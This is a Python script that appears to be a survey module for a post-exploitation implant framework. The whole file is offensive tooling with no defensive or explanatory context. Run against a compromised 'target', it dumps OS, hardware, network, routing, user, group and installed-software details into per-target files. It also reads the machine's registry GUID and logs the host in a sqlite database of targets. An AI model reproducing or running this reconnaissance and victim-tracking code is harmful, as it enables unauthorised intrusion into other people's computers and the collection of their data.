import eternalhush as eh
from additional.clingyspider import const
from additional.clingyspider import structs
from additional.clingyspider import api
import sqlite3
import os

TARGET_STORAGE = os.path.join(eh.ui.GetGlobalEnv('OPERATION_PATH'), eh.ui.GetEnv('TARGET_DATADIR'))

def run_informational():
    eh.ui.Echo("=============================== OS INFORMATION ===============================", eh.ECHO_GOOD)
    eh.ui.Run(f"!sysinfo -xmlout {TARGET_STORAGE}\\osinfo.xml", eh.RUN_NORMAL)
    eh.ui.Run(f"!systemtime -xmlout {TARGET_STORAGE}\\system_time.xml", eh.RUN_NORMAL)

    eh.ui.Echo("=============================== HARDWARE INFORMATION ===============================", eh.ECHO_GOOD)
    eh.ui.Run(f"!hwinfo -xmlout {TARGET_STORAGE}\\hardware.xml", eh.RUN_NORMAL)

    eh.ui.Echo("=============================== NETWORKING ===============================", eh.ECHO_GOOD)
    eh.ui.Run(f"!ipconfig -xmlout {TARGET_STORAGE}\\networking.xml", eh.RUN_NORMAL)
    eh.ui.Run(f"!route -query -xmlout {TARGET_STORAGE}\\network_table.xml", eh.RUN_NORMAL)

    eh.ui.Echo("=============================== ACCOUNTING ===============================", eh.ECHO_GOOD)
    eh.ui.Run(f"!users -xmlout {TARGET_STORAGE}\\local_users.xml", eh.RUN_NORMAL)
    eh.ui.Run(f"!groups -xmlout {TARGET_STORAGE}\\local_groups.xml", eh.RUN_NORMAL)

    eh.ui.Echo("=============================== SOFTWARE ===============================", eh.ECHO_GOOD)
    eh.ui.Run(f"!apps -xmlout {TARGET_STORAGE}\\software.xml", eh.RUN_NORMAL)


def run_initialize():
    handle_machine_guid = api.RegOpenKey(const.HKEY_LOCAL_MACHINE, "SOFTWARE\\Microsoft\\Cryptography", const.KEY_QUERY_VALUE)
    if eh.ui.GetLastError() != 0:
        eh.ui.Echo("Failed to query machine guid, target won't be added to database.", eh.ECHO_DEFAULT)
        return

    machine_guid = api.RegQueryValue(handle_machine_guid, "MachineGuid").data.get()[:-2].decode('utf-16-le')
    api.RegCloseKey(handle_machine_guid)
    eh.ui.SetEnv('MACHINE_GUID', machine_guid)

    directory_name = "TARGET_" + eh.ui.GetEnv('CONSOLE_HOSTNAME')
    eh.ui.SetEnv('TARGET_DATADIR', directory_name)

    if not os.path.exists(eh.ui.GetGlobalEnv('OPERATION_PATH') + "\\" + directory_name):
        os.mkdir(eh.ui.GetGlobalEnv('OPERATION_PATH') + "\\" + directory_name)

    con = sqlite3.connect(eh.ui.GetGlobalEnv("OPERATION_PATH")+"/cs_targets.db")
    cur = con.cursor()
    cur.execute("create table if not exists clingyspider_targets(machine_guid, machine_directory, UNIQUE(machine_guid))")

    is_exists = cur.execute("SELECT rowid FROM clingyspider_targets WHERE machine_guid = ?", (machine_guid,)).fetchone()
    if is_exists == None:
        eh.ui.Echo(f"Adding new target {machine_guid} in database", eh.ECHO_DEFAULT)
        res = cur.execute("INSERT OR IGNORE INTO clingyspider_targets(machine_guid, machine_directory) VALUES (?,?)", (machine_guid, directory_name)) 
        #run_survey_script(machine_guid, directory_name)
        eh.ui.SetEnv('CLSP_SURVEY_KNOWN_TARGET', 'false')
    else:
        eh.ui.Echo(f"Target {machine_guid} already exists in database", eh.ECHO_WARNING)
        eh.ui.SetEnv('CLSP_SURVEY_KNOWN_TARGET', 'true')
        
    con.commit()
    con.close()

def main(args):
    if args.profile.lower() == 'informational':
        run_informational()
    elif args.profile.lower() == 'initialize':
        run_initialize()

    eh.ui.Echo('Survey completed', eh.ECHO_WARNING)